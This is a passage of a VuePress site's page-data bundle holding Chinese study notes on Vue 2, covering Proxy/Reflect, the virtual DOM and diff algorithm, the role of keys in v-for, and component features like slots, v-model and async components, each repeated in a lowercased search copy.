{\n          d: "abc121211",\n        },\n      },\n    },\n  },\n};\n//实现监听数据\nconst proxydata = reactive(data);\n\n\n\n# proxy 优势\n\n * 深度监听，性能更好\n * 可以监听数组变化\n * 可以监听新增和删除对象属性\n\n\n# reflect（反射）\n\nconst obj = { a: 1, b: 2, c: 3 };\n//检查对象中是否有某个属性\n"a" in obj; //true\nreflect.has(obj, "a"); //true\n//删除某属性\ndelete obj.a;\nreflect.deleteproperty(obj, "a"); //建议使用此api\n//获取属性\nobject.getownpropertynames(obj); ////[\'a\',\'b\',\'c\']\nreflect.ownkeys(obj); //[\'a\',\'b\',\'c\']\n',charsets:{cjk:!0}},{title:"虚拟dom和diff算法",frontmatter:{title:"虚拟dom和diff算法"},regularPath:"/webstudy/Vue2/%E8%99%9A%E6%8B%9Fdom%E5%92%8Cdiff%E7%AE%97%E6%B3%95.html",relativePath:"webstudy/Vue2/虚拟dom和diff算法.md",key:"v-70951521",path:"/webstudy/Vue2/%E8%99%9A%E6%8B%9Fdom%E5%92%8Cdiff%E7%AE%97%E6%B3%95.html",headers:[{level:2,title:"vdom",slug:"vdom",normalizedTitle:"vdom",charIndex:19},{level:3,title:"为什么使用vdom？",slug:"为什么使用vdom",normalizedTitle:"为什么使用vdom？",charIndex:28},{level:3,title:"模拟一个vdom",slug:"模拟一个vdom",normalizedTitle:"模拟一个vdom",charIndex:178},{level:3,title:"框架的价值(Vue,React)",slug:"框架的价值-vue-react",normalizedTitle:"框架的价值(vue,react)",charIndex:595},{level:3,title:"vdom真的很快吗？",slug:"vdom真的很快吗",normalizedTitle:"vdom真的很快吗？",charIndex:683},{level:3,title:"扩展",slug:"扩展",normalizedTitle:"扩展",charIndex:881},{level:2,title:"diff算法",slug:"diff算法",normalizedTitle:"diff算法",charIndex:8},{level:3,title:"步骤",slug:"步骤",normalizedTitle:"步骤",charIndex:957},{level:3,title:"diff策略",slug:"diff策略",normalizedTitle:"diff策略",charIndex:1120},{level:3,title:"Vue2 diff 特点 - 双端相互比较",slug:"vue2-diff-特点-双端相互比较",normalizedTitle:"vue2 diff 特点 - 双端相互比较",charIndex:1463},{level:3,title:"Vue3 diff 特点 - 最长递增子序列",slug:"vue3-diff-特点-最长递增子序列",normalizedTitle:"vue3 diff 特点 - 最长递增子序列",charIndex:1669},{level:3,title:"diff 的原理",slug:"diff-的原理",normalizedTitle:"diff 的原理",charIndex:2013},{level:3,title:"diff 算法中的 key",slug:"diff-算法中的-key",normalizedTitle:"diff 算法中的 key",charIndex:2211}],headersStr:"vdom 为什么使用vdom？ 模拟一个vdom 框架的价值(Vue,React) vdom真的很快吗？ 扩展 diff算法 步骤 diff策略 Vue2 diff 特点 - 双端相互比较 Vue3 diff 特点 - 最长递增子序列 diff 的原理 diff 算法中的 key",content:"# 虚拟dom和diff算法\n\n\n# vdom\n\n\n# 为什么使用vdom？\n\n因为js的运行速度比操作dom的速度要快很多，把操作dom这个思路转变为操作js，通过js模拟dom结构，识别dom变更，然后更新视图 不断的修改真实的DOM会引发回流和重绘，大大降低了页面的渲染能力，而虚拟DOM的产生则是减少了频繁操作DOM而带来的一系列性能问题\n\n\n# 模拟一个vdom\n\n<div id='div1' class='container'>\n <p>vdom</p>\n <ul style='font-size:20px'>\n  <li>a</li> \n </ul>\n</div>\n\n<script>\n const dom = {\n   tag:'div',\n  props:{\n   className:'container',\n   id:'div1'\n  },\n  children:[\n   {\n    tag:'p',\n    children:'vdom'\n   },\n   {\n    tag:'ul',\n    props:{style:'font-size:20px'},\n    children:[\n     {\n       tag:'li',\n      children:'a'\n     }\n    ]\n   }\n  ]\n }\n<\/script>\n\n\n\n# 框架的价值(Vue,React)\n\n * 组件化 —— 这不是核心原因。WebComponent 已提出多年，当仍未发展壮大\n * 数据视图分离，数据驱动视图(核心)\n\n\n# vdom真的很快吗？\n\n * 直接进行 DOM 操作永远都是最快的（但要目标明确，不能有无谓的 DOM 操作 —— 这很难）\n * 如果业务复杂，要“数据视图分离，数据驱动视图”，无法直接修改 DOM ，那 vdom 就是一个很好的选择\n\n所以，vdom 并不比 DOM 操作更快（反而更慢，它做了 JS 运算），它只是在某个特定的场景下，无法做到精准 DOM 修改时，一个更优的选择。\n\n\n# 扩展\n\nSvelte 不使用 vdom ，它将组件修改，编译为精准的 DOM 操作。和 React 设计思路完全不一样。\n\n\n# diff算法\n\n\n# 步骤\n\n * 用JavaScript 对象结构表示DOM树的结构；然后用这个树构建一个真正的DOM树，插到文档当中\n * 当状态变更的时候，重新构造一棵新的对象树。然后用新的树和旧的树进行比较(diff)，记录两棵树差异\n * 把第二棵树所记录的差异应用到第一棵树所构建的真正的DOM树上(patch)，视图就更新了\n\n\n# diff策略\n\ndiff整体策略为：深度优先，同层比较，不会跨级，从两边向中间\n\nDOM的频繁改变会产生一系列性能问题，而使用虚拟DOM替代真实DOM，最大的优势在于不断的去修改虚拟DOM后，才会一次性的与真实DOM的差异性做对比，然后只会去修改真实的DOM一次。而这种差异性对比，也就是diff算法。\n\n**注：**Vue React 都是用于网页开发，基于 DOM 结构，对 diff 算法都进行了优化（或者简化）,最终把时间复杂度降低到 O(n)\n\n * 只在同一层级比较，不夸层级 （DOM 结构的变化，很少有跨层级移动）\n * tag 不同则直接删掉重建，不去对比内部细节（DOM 结构变化，很少有只改外层，不改内层）\n * 同一个节点下的子节点，通过 key 区分\n\n\n# Vue2 diff 特点 - 双端相互比较\n\nb站上的一个视频\n\n好比在列表中插入值\n\n * 定义四个指针，分别比较\n * oldStartNode 和 newStartNode\n * oldStartNode 和 newEndNode\n * oldEndNode 和 newStartNode\n * oldEndNode 和 newEndNode\n * 指针继续向中间移动，知道指针汇合。\n\n\n\n参考\n\n\n# Vue3 diff 特点 - 最长递增子序列\n\n例如数组 [3，5，7，1，2，8] 的最长递增子序列就是 [3，5，7，8 ] 。这是一个专门的算法。\n\n * 1、通过“前-前”比较找到开始的不变节点 [A, B]\n * 2、通过“后-后”比较找到末尾的不变节点 [G]\n * 3、剩余的有变化的节点 [F, C, D, E, H]\n * 4、通过 newIndexToOldIndexMap 拿到 oldChildren 中对应的 index [5, 2, 3, 4, -1] （-1 表示之前没有，要新增）\n * 5、计算最长递增子序列得到 [2, 3, 4] ，对应的就是 [C, D, E] ，即这些节点可以不变\n * 6、剩余的节点，根据 index 进行新增、删除\n\n\n# diff 的原理\n\n当data变化之后，视图会触发更新，那么这个过程是什么样的呢？ 首先data变化后，会触发setter 接着，编译模板为render函数 render函数生成vNode，这是个新的vNode 接着会patch(oldVnode, newVnode)，这个对比过程中用到的就是diff算法 接着异步渲染更新 由于vNode使用对象表示DOM的形式，大体上是一颗多叉树。\n\n\n# diff 算法中的 key\n\nkey是给每一个vnode的唯一id，也是diff的一种优化策略，可以根据key，更准确， 更快的找到对应的vnode节点\n\n * 根据key判断元素是否要删除\n * 匹配到key，只移动元素-性能较好\n * 未匹配到key，则删除重建-性能较差\n * 加了key之后，可以便于diff算法的计算，大幅度增加性能\n\n推荐key使用唯一值(例如唯一的id)",normalizedContent:"# 虚拟dom和diff算法\n\n\n# vdom\n\n\n# 为什么使用vdom？\n\n因为js的运行速度比操作dom的速度要快很多，把操作dom这个思路转变为操作js，通过js模拟dom结构，识别dom变更，然后更新视图 不断的修改真实的dom会引发回流和重绘，大大降低了页面的渲染能力，而虚拟dom的产生则是减少了频繁操作dom而带来的一系列性能问题\n\n\n# 模拟一个vdom\n\n<div id='div1' class='container'>\n <p>vdom</p>\n <ul style='font-size:20px'>\n  <li>a</li> \n </ul>\n</div>\n\n<script>\n const dom = {\n   tag:'div',\n  props:{\n   classname:'container',\n   id:'div1'\n  },\n  children:[\n   {\n    tag:'p',\n    children:'vdom'\n   },\n   {\n    tag:'ul',\n    props:{style:'font-size:20px'},\n    children:[\n     {\n       tag:'li',\n      children:'a'\n     }\n    ]\n   }\n  ]\n }\n<\/script>\n\n\n\n# 框架的价值(vue,react)\n\n * 组件化 —— 这不是核心原因。webcomponent 已提出多年，当仍未发展壮大\n * 数据视图分离，数据驱动视图(核心)\n\n\n# vdom真的很快吗？\n\n * 直接进行 dom 操作永远都是最快的（但要目标明确，不能有无谓的 dom 操作 —— 这很难）\n * 如果业务复杂，要“数据视图分离，数据驱动视图”，无法直接修改 dom ，那 vdom 就是一个很好的选择\n\n所以，vdom 并不比 dom 操作更快（反而更慢，它做了 js 运算），它只是在某个特定的场景下，无法做到精准 dom 修改时，一个更优的选择。\n\n\n# 扩展\n\nsvelte 不使用 vdom ，它将组件修改，编译为精准的 dom 操作。和 react 设计思路完全不一样。\n\n\n# diff算法\n\n\n# 步骤\n\n * 用javascript 对象结构表示dom树的结构；然后用这个树构建一个真正的dom树，插到文档当中\n * 当状态变更的时候，重新构造一棵新的对象树。然后用新的树和旧的树进行比较(diff)，记录两棵树差异\n * 把第二棵树所记录的差异应用到第一棵树所构建的真正的dom树上(patch)，视图就更新了\n\n\n# diff策略\n\ndiff整体策略为：深度优先，同层比较，不会跨级，从两边向中间\n\ndom的频繁改变会产生一系列性能问题，而使用虚拟dom替代真实dom，最大的优势在于不断的去修改虚拟dom后，才会一次性的与真实dom的差异性做对比，然后只会去修改真实的dom一次。而这种差异性对比，也就是diff算法。\n\n**注：**vue react 都是用于网页开发，基于 dom 结构，对 diff 算法都进行了优化（或者简化）,最终把时间复杂度降低到 o(n)\n\n * 只在同一层级比较，不夸层级 （dom 结构的变化，很少有跨层级移动）\n * tag 不同则直接删掉重建，不去对比内部细节（dom 结构变化，很少有只改外层，不改内层）\n * 同一个节点下的子节点，通过 key 区分\n\n\n# vue2 diff 特点 - 双端相互比较\n\nb站上的一个视频\n\n好比在列表中插入值\n\n * 定义四个指针，分别比较\n * oldstartnode 和 newstartnode\n * oldstartnode 和 newendnode\n * oldendnode 和 newstartnode\n * oldendnode 和 newendnode\n * 指针继续向中间移动，知道指针汇合。\n\n\n\n参考\n\n\n# vue3 diff 特点 - 最长递增子序列\n\n例如数组 [3，5，7，1，2，8] 的最长递增子序列就是 [3，5，7，8 ] 。这是一个专门的算法。\n\n * 1、通过“前-前”比较找到开始的不变节点 [a, b]\n * 2、通过“后-后”比较找到末尾的不变节点 [g]\n * 3、剩余的有变化的节点 [f, c, d, e, h]\n * 4、通过 newindextooldindexmap 拿到 oldchildren 中对应的 index [5, 2, 3, 4, -1] （-1 表示之前没有，要新增）\n * 5、计算最长递增子序列得到 [2, 3, 4] ，对应的就是 [c, d, e] ，即这些节点可以不变\n * 6、剩余的节点，根据 index 进行新增、删除\n\n\n# diff 的原理\n\n当data变化之后，视图会触发更新，那么这个过程是什么样的呢？ 首先data变化后，会触发setter 接着，编译模板为render函数 render函数生成vnode，这是个新的vnode 接着会patch(oldvnode, newvnode)，这个对比过程中用到的就是diff算法 接着异步渲染更新 由于vnode使用对象表示dom的形式，大体上是一颗多叉树。\n\n\n# diff 算法中的 key\n\nkey是给每一个vnode的唯一id，也是diff的一种优化策略，可以根据key，更准确， 更快的找到对应的vnode节点\n\n * 根据key判断元素是否要删除\n * 匹配到key，只移动元素-性能较好\n * 未匹配到key，则删除重建-性能较差\n * 加了key之后，可以便于diff算法的计算，大幅度增加性能\n\n推荐key使用唯一值(例如唯一的id)",charsets:{cjk:!0}},{title:"key",frontmatter:{},regularPath:"/webstudy/Vue2/key.html",relativePath:"webstudy/Vue2/key.md",key:"v-2bef01e8",path:"/webstudy/Vue2/key.html",headers:[{level:2,title:"大概需要思考如下几个问题?",slug:"大概需要思考如下几个问题",normalizedTitle:"大概需要思考如下几个问题?",charIndex:73},{level:3,title:"1、vue中的就地复用策略",slug:"_1、vue中的就地复用策略",normalizedTitle:"1、vue中的就地复用策略",charIndex:91},{level:3,title:"2、key的使用",slug:"_2、key的使用",normalizedTitle:"2、key的使用",charIndex:2079},{level:3,title:"3、看一下key使用index的情况",slug:"_3、看一下key使用index的情况",normalizedTitle:"3、看一下key使用index的情况",charIndex:2725},{level:3,title:"4、key的一些使用场景",slug:"_4、key的一些使用场景",normalizedTitle:"4、key的一些使用场景",charIndex:3106},{level:3,title:"5、diff中的key",slug:"_5、diff中的key",normalizedTitle:"5、diff中的key",charIndex:3916}],headersStr:"大概需要思考如下几个问题? 1、vue中的就地复用策略 2、key的使用 3、看一下key使用index的情况 4、key的一些使用场景 5、diff中的key",content:'# key\n\nkey是给每一个vnode的唯一id，也是diff的一种优化策略，可以根据key，更准确， 更快的找到对应的vnode节点\n\n\n# 大概需要思考如下几个问题?\n\n * 1、vue中的就地复用策略，设置key值一定能提高diff效率吗？\n * 2、v-for中的key的作用，key能不能用index?哪些场景可以使用index作为key，那些场景不能用？\n * 3、如果key使用index，通过push在list中间某处插入几条数据，请问会有什么问题吗？\n * 4、动态组件中的key的使用\n * 5、深入key在diff中的使用\n\n\n# 1、vue中的就地复用策略\n\n文档原话: 当 Vue.js 用 v-for 正在更新已渲染过的元素列表时，它默认用 “就地复用” 策略。如果数据项的顺序被改变，Vue将不是移动 DOM 元素来匹配数据项的顺序， 而是简单复用此处每个元素，并且确保它在特定索引下显示已被渲染过的每个元素.这个默认的模式是有效的，但是只适用于不依赖子组件状态或临时 DOM 状态（例如：表单输入值）的列表渲染输出。\n\n在浏览器运行如下代码： 你会发现：\n\n * vue默认的就地复用策略中(不用key),点击button, input输入框并不会随文本一起下移，为什么？是因为输入框没有与数据(data)绑定, 所以vuejs默认使用已经渲染的dom, 然而文本是与数据绑定的, 所以文本被重新渲染，这种复用方式是高效的。但dom的结构会与我们预期想要的不同，在日常开发中，这也是一个问题。\n\n<!DOCTYPE html>\n<html>\n  <head>\n    <meta charset="utf-8" />\n    <meta name="viewport" content="width=device-width" />\n    <title>key的就地复用</title>\n  </head>\n  <body>\n    <script src="https://cdn.bootcss.com/vue/2.5.17-beta.0/vue.min.js"><\/script>\n    <div id="app">\n      <h3>就地复用</h3>\n      <div v-for="(p, i) in persons">\n        {{p.name}}\n        <input type="text" />\n        <button @click="down(i)" v-if="i != persons.length - 1">下移</button>\n      </div>\n\n      <h3>不采用就地复用策略(设置key)</h3>\n      <div v-for="(p, i) in persons" :key="p.id">\n        {{p.name}}\n        <input type="text" />\n        <button @click="down(i)" v-if="i != persons.length - 1">下移</button>\n      </div>\n    </div>\n\n    <script>\n      new Vue({\n        el: "#app",\n        data: {\n          persons: [\n            { id: 1, name: "inputA" },\n            { id: 2, name: "inputB" },\n            { id: 3, name: "inputC" },\n          ],\n        },\n        methods: {\n          down: function (i) {\n            if (i == this.persons.length - 1) return;\n            var listClone = this.persons.slice();\n            var one = listClone[i];\n            listClone[i] = listClone[i + 1];\n            listClone[i + 1] = one;\n            this.persons = listClone;\n          },\n        },\n      });\n    <\/script>\n  </body>\n</html>\n\n\n# 设置key值一定能提高diff效率吗？\n\n其实默认的就地复用策略是高效的，但是只适用于不依赖子组件状态或临时 DOM 状态 (例如：表单输入值) 的列表渲染输出 所以,key并非高效，但在实际开发中我们需要使用key\n\n\n# 2、key的使用\n\n如果你的列表元素存在与用户交互的场景(比如form表单或者重新排序等), 那么请你为 v-for指令设置key参数,key指向列表中每个元素的唯一值.\n\n但，建议v-for时提供key\n\n# 使用key和不使用key的区别\n\n下面看一张图\n\n不使用key\n\n * A，A，相同类型的节点，进行patch，但数据相同，不发生dom操作\n * B，B，相同类型的节点，进行patch，但数据相同，不发生dom操作\n * C，F，相同类型的节点，进行patch，数据不同，发生dom操作\n * D，C，相同类型的节点，进行patch，数据不同，发生dom操作\n * E，D，相同类型的节点，进行patch，数据不同，发生dom操作\n * 循环结束，将E插入到DOM中\n * 3次更新，1次插入操作\n\n如果使用key\n\n * A，A，相同类型的节点，进行patch，但数据相同，不发生dom操作\n * B，B，相同类型的节点，进行patch，但数据相同，不发生dom操作\n * C，F，不相同类型的节点 然后\n * E、E，相同类型的节点，进行patch，但数据相同，不发生dom操作\n * D、D，相同类型的节点，进行patch，但数据相同，不发生dom操作\n * C、C，相同类型的节点，进行patch，但数据相同，不发生dom操作\n * 循环结束，将F插入到C之前\n * 0次更新，1次插入操作\n\n# 总结:key能够大大减少对页面的DOM操作，提高了diff效率\n\n\n# 3、看一下key使用index的情况\n\n使用index作为key\n\n# 在数组后面追加一条数据\n\n前面的数据页面不会重新渲染，直接复用老的，只会新渲染最后一条数据，此时用index作为key，没有问题。\n\n# 在数组中间插入一条数据\n\n根据下面的代码可以看出,除了num：1的数据，剩下的数据都需要重新计算渲染\n\nkey: 0  index: 0 num: 1     key: 0  index: 0 num: 1\nkey: 1  index: 1 num: 2     key: 1  index: 1 num: \'此处是新插入的数据4\'\nkey: 2  index: 2 num: 3     key: 2  index: 2 num: 2\n                            key: 3  index: 3 num: 3\n\n\n\n# 4、key的一些使用场景\n\n# 动态组件中需要强制刷新组件的场景\n\n<template>\n    <my-component :key="key"></my-component>\n</template>\n<script>\nexport default {\n  data(){\n    return{\n      key:new Date().getTime(); \n    }\n  },\n  watch:{\n    key:{\n     immediate:true,\n     handler(newValue,oldValue){\n       this.key = new Date().getTime()\n     }\n    }\n  }\n}\n<\/script>\n\n\n# keep-alive中的key\n\n<<template>\n  <keep-alive :include="Components">\n    <router-view :key="key" />\n  </keep-alive>\n</template>\n<script>\nexport default {\n  name: \'AppMain\',\n  computed: {\n    Components() {\n      return [\'A\',\'B\']\n    },\n    key() {\n      return this.$route.fullPath\n    }\n  }\n}\n<\/script>\n\n\nkeep-alive的目的就是缓存组件， 但如果以下的场景\n\n * 从/verList/1到 verList/2\n * 从/verList/id=1到 verList/id=2\n\n当我们使用keep-alive缓存，路由进行切换时，组件内的created, mounted等钩子不会执行, 所以会导致数据不更新,页面不渲染。\n\n\n# 5、diff中的key\n\n判断sameVnode\n\nfunction sameVnode (a, b) {\n  return (\n    a.key === b.key && (\n      (\n        a.tag === b.tag &&\n        a.isComment === b.isComment &&\n        isDef(a.data) === isDef(b.data) &&\n        sameInputType(a, b)\n        ) || (\n        isTrue(a.isAsyncPlaceholder) &&\n        a.asyncFactory === b.asyncFactory &&\n        isUndef(b.asyncFactory.error)\n      )\n    )\n  )\n}\n',normalizedContent:'# key\n\nkey是给每一个vnode的唯一id，也是diff的一种优化策略，可以根据key，更准确， 更快的找到对应的vnode节点\n\n\n# 大概需要思考如下几个问题?\n\n * 1、vue中的就地复用策略，设置key值一定能提高diff效率吗？\n * 2、v-for中的key的作用，key能不能用index?哪些场景可以使用index作为key，那些场景不能用？\n * 3、如果key使用index，通过push在list中间某处插入几条数据，请问会有什么问题吗？\n * 4、动态组件中的key的使用\n * 5、深入key在diff中的使用\n\n\n# 1、vue中的就地复用策略\n\n文档原话: 当 vue.js 用 v-for 正在更新已渲染过的元素列表时，它默认用 “就地复用” 策略。如果数据项的顺序被改变，vue将不是移动 dom 元素来匹配数据项的顺序， 而是简单复用此处每个元素，并且确保它在特定索引下显示已被渲染过的每个元素.这个默认的模式是有效的，但是只适用于不依赖子组件状态或临时 dom 状态（例如：表单输入值）的列表渲染输出。\n\n在浏览器运行如下代码： 你会发现：\n\n * vue默认的就地复用策略中(不用key),点击button, input输入框并不会随文本一起下移，为什么？是因为输入框没有与数据(data)绑定, 所以vuejs默认使用已经渲染的dom, 然而文本是与数据绑定的, 所以文本被重新渲染，这种复用方式是高效的。但dom的结构会与我们预期想要的不同，在日常开发中，这也是一个问题。\n\n<!doctype html>\n<html>\n  <head>\n    <meta charset="utf-8" />\n    <meta name="viewport" content="width=device-width" />\n    <title>key的就地复用</title>\n  </head>\n  <body>\n    <script src="https://cdn.bootcss.com/vue/2.5.17-beta.0/vue.min.js"><\/script>\n    <div id="app">\n      <h3>就地复用</h3>\n      <div v-for="(p, i) in persons">\n        {{p.name}}\n        <input type="text" />\n        <button @click="down(i)" v-if="i != persons.length - 1">下移</button>\n      </div>\n\n      <h3>不采用就地复用策略(设置key)</h3>\n      <div v-for="(p, i) in persons" :key="p.id">\n        {{p.name}}\n        <input type="text" />\n        <button @click="down(i)" v-if="i != persons.length - 1">下移</button>\n      </div>\n    </div>\n\n    <script>\n      new vue({\n        el: "#app",\n        data: {\n          persons: [\n            { id: 1, name: "inputa" },\n            { id: 2, name: "inputb" },\n            { id: 3, name: "inputc" },\n          ],\n        },\n        methods: {\n          down: function (i) {\n            if (i == this.persons.length - 1) return;\n            var listclone = this.persons.slice();\n            var one = listclone[i];\n            listclone[i] = listclone[i + 1];\n            listclone[i + 1] = one;\n            this.persons = listclone;\n          },\n        },\n      });\n    <\/script>\n  </body>\n</html>\n\n\n# 设置key值一定能提高diff效率吗？\n\n其实默认的就地复用策略是高效的，但是只适用于不依赖子组件状态或临时 dom 状态 (例如：表单输入值) 的列表渲染输出 所以,key并非高效，但在实际开发中我们需要使用key\n\n\n# 2、key的使用\n\n如果你的列表元素存在与用户交互的场景(比如form表单或者重新排序等), 那么请你为 v-for指令设置key参数,key指向列表中每个元素的唯一值.\n\n但，建议v-for时提供key\n\n# 使用key和不使用key的区别\n\n下面看一张图\n\n不使用key\n\n * a，a，相同类型的节点，进行patch，但数据相同，不发生dom操作\n * b，b，相同类型的节点，进行patch，但数据相同，不发生dom操作\n * c，f，相同类型的节点，进行patch，数据不同，发生dom操作\n * d，c，相同类型的节点，进行patch，数据不同，发生dom操作\n * e，d，相同类型的节点，进行patch，数据不同，发生dom操作\n * 循环结束，将e插入到dom中\n * 3次更新，1次插入操作\n\n如果使用key\n\n * a，a，相同类型的节点，进行patch，但数据相同，不发生dom操作\n * b，b，相同类型的节点，进行patch，但数据相同，不发生dom操作\n * c，f，不相同类型的节点 然后\n * e、e，相同类型的节点，进行patch，但数据相同，不发生dom操作\n * d、d，相同类型的节点，进行patch，但数据相同，不发生dom操作\n * c、c，相同类型的节点，进行patch，但数据相同，不发生dom操作\n * 循环结束，将f插入到c之前\n * 0次更新，1次插入操作\n\n# 总结:key能够大大减少对页面的dom操作，提高了diff效率\n\n\n# 3、看一下key使用index的情况\n\n使用index作为key\n\n# 在数组后面追加一条数据\n\n前面的数据页面不会重新渲染，直接复用老的，只会新渲染最后一条数据，此时用index作为key，没有问题。\n\n# 在数组中间插入一条数据\n\n根据下面的代码可以看出,除了num：1的数据，剩下的数据都需要重新计算渲染\n\nkey: 0  index: 0 num: 1     key: 0  index: 0 num: 1\nkey: 1  index: 1 num: 2     key: 1  index: 1 num: \'此处是新插入的数据4\'\nkey: 2  index: 2 num: 3     key: 2  index: 2 num: 2\n                            key: 3  index: 3 num: 3\n\n\n\n# 4、key的一些使用场景\n\n# 动态组件中需要强制刷新组件的场景\n\n<template>\n    <my-component :key="key"></my-component>\n</template>\n<script>\nexport default {\n  data(){\n    return{\n      key:new date().gettime(); \n    }\n  },\n  watch:{\n    key:{\n     immediate:true,\n     handler(newvalue,oldvalue){\n       this.key = new date().gettime()\n     }\n    }\n  }\n}\n<\/script>\n\n\n# keep-alive中的key\n\n<<template>\n  <keep-alive :include="components">\n    <router-view :key="key" />\n  </keep-alive>\n</template>\n<script>\nexport default {\n  name: \'appmain\',\n  computed: {\n    components() {\n      return [\'a\',\'b\']\n    },\n    key() {\n      return this.$route.fullpath\n    }\n  }\n}\n<\/script>\n\n\nkeep-alive的目的就是缓存组件， 但如果以下的场景\n\n * 从/verlist/1到 verlist/2\n * 从/verlist/id=1到 verlist/id=2\n\n当我们使用keep-alive缓存，路由进行切换时，组件内的created, mounted等钩子不会执行, 所以会导致数据不更新,页面不渲染。\n\n\n# 5、diff中的key\n\n判断samevnode\n\nfunction samevnode (a, b) {\n  return (\n    a.key === b.key && (\n      (\n        a.tag === b.tag &&\n        a.iscomment === b.iscomment &&\n        isdef(a.data) === isdef(b.data) &&\n        sameinputtype(a, b)\n        ) || (\n        istrue(a.isasyncplaceholder) &&\n        a.asyncfactory === b.asyncfactory &&\n        isundef(b.asyncfactory.error)\n      )\n    )\n  )\n}\n',charsets:{cjk:!0}},{title:"特性",frontmatter:{},regularPath:"/webstudy/Vue2/%E7%89%B9%E6%80%A7.html",relativePath:"webstudy/Vue2/特性.md",key:"v-1a493651",path:"/webstudy/Vue2/%E7%89%B9%E6%80%A7.html",headers:[{level:2,title:"v-model语法糖",slug:"v-model语法糖",normalizedTitle:"v-model语法糖",charIndex:9},{level:2,title:"slot插槽",slug:"slot插槽",normalizedTitle:"slot插槽",charIndex:461},{level:3,title:"1、作用域插槽",slug:"_1、作用域插槽",normalizedTitle:"1、作用域插槽",charIndex:472},{level:3,title:"2、具名插槽",slug:"_2、具名插槽",normalizedTitle:"2、具名插槽",charIndex:888},{level:2,title:"动态组件",slug:"动态组件",normalizedTitle:"动态组件",charIndex:1272},{level:3,title:"动态组件中key的使用",slug:"动态组件中key的使用",normalizedTitle:"动态组件中key的使用",charIndex:1333},{level:2,title:"异步组件",slug:"异步组件",normalizedTitle:"异步组件",charIndex:1349},{level:2,title:"keep-alive",slug:"keep-alive",normalizedTitle:"keep-alive",charIndex:1707},{level:2,title:"mixin(混入)",slug:"mixin-混入",normalizedTitle:"mixin(混入)",charIndex:1744},{level:3,title:"缺点",slug:"缺点",normalizedTitle:"缺点",charIndex:1758}],headersStr:"v-model语法糖 slot插槽 1、作用域插槽 2、具名插槽 动态组件 动态组件中key的使用 异步组件 keep-alive mixin(混入) 缺点",content:'# 特性\n\n\n# v-model语法糖\n\n//父组件中\n<my-input v-model=\'value\' @change=\'handleChange\'>\n//子组件中\n<template>\n  <input type=\'text\' :value=\'value\' @input="$emit(\'change\', $event.target.value)">\n</template>\n<script>\n  export default {\n   name: "myInput",\n   // 定义v-model传过来的值名字是value1 修改值的事件是change事件\n   model: {\n    prop: \'value\', // 对应 props value\n    event: \'change\'\n   },\n   props: {\n    value: [String,Number],\n    default() {\n     return \'\'\n    }\n   }\n  }\n<\/script>\n\n\n\n# slot插槽\n\n\n# 1、作用域插槽\n\n//父\n<new-demo>\n 通过slotProps接收\n   <template v-slot="slotProps">\n     {{ slotProps.info.name }} //yang\n   </template>\n</new-demo>\n//子\n<template>\n  <div>\n    <slot :data="info">\n      {{ "这里显示默认值" }}\n    </slot>\n  </div>\n</template>\n\n<script>\nexport default {\n  name: "Yang",\n  components: {},\n  data() {\n    return {\n      info: {\n        name: "yang",\n        age: 18,\n      },\n    };\n  },\n};\n<\/script>\n\n\n\n# 2、具名插槽\n\n//父组件中\n<base-layout>\n <template #header>  //或者不简写v-slot=\'header\'\n  <h1>Here might be a page title</h1>\n </template>\n <template #footer>\n  <p>Here\'s some contact info</p>\n </template>\n</base-layout>\n//子组件中\n<div class="container">\n <header>\n  <slot name="header"></slot>\n </header>\n <main>\n  <slot></slot>\n </main>\n <footer>\n  <slot name="footer"></slot>\n </footer>\n</div>\n\n\n\n# 动态组件\n\n<component :is="currentTabComponent"></component>\n\n\n\n# 动态组件中key的使用\n\n\n# 异步组件\n\n单独打包，异步加载，不会被直接打包到当前文件中而导致页面渲染就直接加载\n\n<template>\n  <-- 异步组件 --\x3e\n  <FormDemo v-if="showFormDemo"/>\n  <button @click="showFormDemo = true">show form demo</button>\n</template>\n<script>\n export default {\n  components: {\n    FormDemo: () => import(\'../BaseUse/FormDemo\'),\n  },\n  data() {\n    return {\n      showFormDemo: false,\n    };\n  },\n};\n<\/script>\n\n\n\n# keep-alive\n\n思考一下那些场景用了keep-alive\n\n\n# mixin(混入)\n\n\n# 缺点\n\n * 1. 变量来源不明确，不利于阅读\n * 2. 多个mixin可能会出现命名冲突\n * 3. mixin和组件出现多对多关系时，导致代码复杂度较高',normalizedContent:'# 特性\n\n\n# v-model语法糖\n\n//父组件中\n<my-input v-model=\'value\' @change=\'handlechange\'>\n//子组件中\n<template>\n  <input type=\'text\' :value=\'value\' @input="$emit(\'change\', $event.target.value)">\n</template>\n<script>\n  export default {\n   name: "myinput",\n   // 定义v-model传过来的值名字是value1 修改值的事件是change事件\n   model: {\n    prop: \'value\', // 对应 props value\n    event: \'change\'\n   },\n   props: {\n    value: [string,number],\n    default() {\n     return \'\'\n    }\n   }\n  }\n<\/script>\n\n\n\n# slot插槽\n\n\n# 1、作用域插槽\n\n//父\n<new-demo>\n 通过slotprops接收\n   <template v-slot="slotprops">\n     {{ slotprops.info.name }} //yang\n   </template>\n</new-demo>\n//子\n<template>\n  <div>\n    <slot :data="info">\n      {{ "这里显示默认值" }}\n    </slot>\n  </div>\n</template>\n\n<script>\nexport default {\n  name: "yang",\n  components: {},\n  data() {\n    return {\n      info: {\n        name: "yang",\n        age: 18,\n      },\n    };\n  },\n};\n<\/script>\n\n\n\n# 2、具名插槽\n\n//父组件中\n<base-layout>\n <template #header>  //或者不简写v-slot=\'header\'\n  <h1>here might be a page title</h1>\n </template>\n <template #footer>\n  <p>here\'s some contact info</p>\n </template>\n</base-layout>\n//子组件中\n<div class="container">\n <header>\n  <slot name="header"></slot>\n </header>\n <main>\n  <slot></slot>\n </main>\n <footer>\n  <slot name="footer"></slot>\n </footer>\n</div>\n\n\n\n# 动态组件\n\n<component :is="currenttabcomponent"></component>\n\n\n\n# 动态组件中key的使用\n\n\n# 异步组件\n\n单独打包，异步加载，不会被直接打包到当前文件中而导致页面渲染就直接加载\n\n<template>\n  <-- 异步组件 --\x3e\n  <formdemo v-if="showformdemo"/>\n  <button @click="showformdemo = true">show form demo</button>\n</template>\n<script>\n export default {\n  components: {\n    formdemo: () => import(\'../baseuse/formdemo\'),\n  },\n  data() {\n    return {\n      showformdemo: false,\n    };\n  },\n};\n<\/script>\n\n\n\n# keep-alive\n\n思考一下那些场景用了keep-alive\n\n\n# mixin(混入)\n\n\n# 缺点\n\n * 1. 变量来源不明确，不利于阅读\n * 2. 多个mixin可能会出现命名冲突\n * 3. 